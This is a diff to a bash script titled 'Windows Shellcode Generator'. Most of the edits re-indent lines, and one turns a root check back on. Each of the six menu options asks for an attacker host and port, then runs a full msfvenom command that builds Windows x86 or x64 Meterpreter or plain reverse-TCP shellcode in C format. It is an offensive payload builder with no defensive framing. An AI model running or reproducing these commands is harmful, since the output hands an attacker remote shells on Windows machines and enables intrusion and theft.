@@ -44,7 +44,7 @@ function checkroot(){
 	    sleep 4
 	    echo ""
     else
-        echo ""
+            echo ""
 	    echo -e " $b[$r$no$b] root $nc"
 	    sleep 4
 	    echo ""
@@ -56,33 +56,32 @@ function checkroot(){
 }
 
 function banner(){
-
-echo -e "$r         __      __  _________ ________"
-echo -e "$r        /  \    /  \/   _____//  _____/" 
-echo -e "$r        \   \/\/   /\_____  \/   \  ___ "
-echo -e "$r         \        / /        \    \_\  \ "
-echo -e "$r          \__/\  / /_______  /\______  / "
-echo -e "$r               \/          \/        \/ "
-echo -e "$b       [$az$cor$b] Windows Shellcode Generator [$az$cor$b] $nc"     
-echo -e "$az                       _.-;;-._   "
-echo -e "$az                '-..-'|   ||   |  "
-echo -e "$az                '-..-'|_.-;;-._|  "
-echo -e "$az                '-..-'|   ||   |  "
-echo -e "$az                '-..-'|_.-''-._|  "
-echo ""
+            echo -e "$r         __      __  _________ ________"
+            echo -e "$r        /  \    /  \/   _____//  _____/" 
+            echo -e "$r        \   \/\/   /\_____  \/   \  ___ "
+            echo -e "$r         \        / /        \    \_\  \ "
+            echo -e "$r          \__/\  / /_______  /\______  / "
+            echo -e "$r               \/          \/        \/ "
+            echo -e "$b       [$az$cor$b] Windows Shellcode Generator [$az$cor$b] $nc"     
+            echo -e "$az                       _.-;;-._   "
+            echo -e "$az                '-..-'|   ||   |  "
+            echo -e "$az                '-..-'|_.-;;-._|  "
+            echo -e "$az                '-..-'|   ||   |  "
+            echo -e "$az                '-..-'|_.-''-._|  "
+            echo ""
 }
 
 function main(){
 	    echo -e "$b <============================================>"
-        echo -e "$b  [$az$n1$b] Meterpreter $az$k1 $b($r$lis1$b)$nc"
-        echo -e "$b  [$az$n2$b] Meterpreter $az$k2 $b($r$lis1$b)$nc"
-        echo -e "$b  [$az$n3$b] Shell       $az$k1 $b($r$lis1$b)$nc"               
-        echo -e "$b  [$az$n4$b] Shell       $az$k2 $b($r$lis1$b)$nc"
-        echo -e "$b  [$az$n5$b] Shell       $az$k1 $b($r$lis2$b)$nc"
-        echo -e "$b  [$az$n6$b] Shell       $az$k2 $b($r$lis2$b)$nc"
-        echo -e "$b  [$az$n7$b] Exit $nc"
-        echo -e "$b <============================================>"
-        echo ""
+            echo -e "$b  [$az$n1$b] Meterpreter $az$k1 $b($r$lis1$b)$nc"
+            echo -e "$b  [$az$n2$b] Meterpreter $az$k2 $b($r$lis1$b)$nc"
+            echo -e "$b  [$az$n3$b] Shell       $az$k1 $b($r$lis1$b)$nc"               
+            echo -e "$b  [$az$n4$b] Shell       $az$k2 $b($r$lis1$b)$nc"
+            echo -e "$b  [$az$n5$b] Shell       $az$k1 $b($r$lis2$b)$nc"
+            echo -e "$b  [$az$n6$b] Shell       $az$k2 $b($r$lis2$b)$nc"
+            echo -e "$b  [$az$n7$b] Exit $nc"
+            echo -e "$b <============================================>"
+            echo ""
 }
 
 function menu(){
@@ -101,10 +100,10 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
-        exit
+            msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            exit
     elif [ $opc -eq 2 ]; then
-        echo ""
+            echo ""
 	    echo -e "$b$lh$nc"
 	    echo ""
 	    read lhost
@@ -115,10 +114,10 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-        msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
-        exit
+            msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            exit
     elif [ $opc -eq 3 ]; then
-        echo ""
+            echo ""
 	    echo -e "$b$lh$nc"
 	    echo ""
 	    read lhost
@@ -129,10 +128,10 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-        msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
-        exit
+            msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            exit
     elif [ $opc -eq 4 ]; then
-        echo ""
+            echo ""
 	    echo -e "$b$lh$nc"
 	    echo ""
 	    read lhost
@@ -143,10 +142,10 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-        msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
-        exit
+            msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            exit
     elif [ $opc -eq 5 ]; then
-        echo ""
+            echo ""
 	    echo -e "$b$lh$nc"
 	    echo ""
 	    read lhost
@@ -157,10 +156,10 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-        msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
-        exit
+            msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            exit
     elif [ $opc -eq 6 ]; then
-        echo ""
+            echo ""
 	    echo -e "$b$lh$nc"
 	    echo ""
 	    read lhost
@@ -171,23 +170,23 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-        msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
-        exit
+            msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            exit
     elif [ $opc -eq 7 ]; then
 	    echo ""
 	    echo ""
 	    echo -e "        |\/\/\/|"
-        echo -e "        |      |" 
-        echo -e "        |      |" 
-        echo -e "        | (o)(o) " 
-        echo -e "        C      _) "
-        echo -e "         | ,___|  "
-        echo -e "         |   /    "
-        echo -e "        /____\ "
-        echo -e "       /      \ $nc"
-        echo -e "$b#### $v BYE $v HACKER $b ####$nc"
-        echo ""
-        echo ""
+            echo -e "        |      |" 
+            echo -e "        |      |" 
+            echo -e "        | (o)(o) " 
+            echo -e "        C      _) "
+            echo -e "         | ,___|  "
+            echo -e "         |   /    "
+            echo -e "        /____\ "
+            echo -e "       /      \ $nc"
+            echo -e "$b#### $v BYE $v HACKER $b ####$nc"
+            echo ""
+            echo ""
 	    sleep 3
 	    exit
     else
@@ -203,7 +202,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 
 clear
 tput civis
-#checkroot
+checkroot
 banner
 main
 tput cnorm
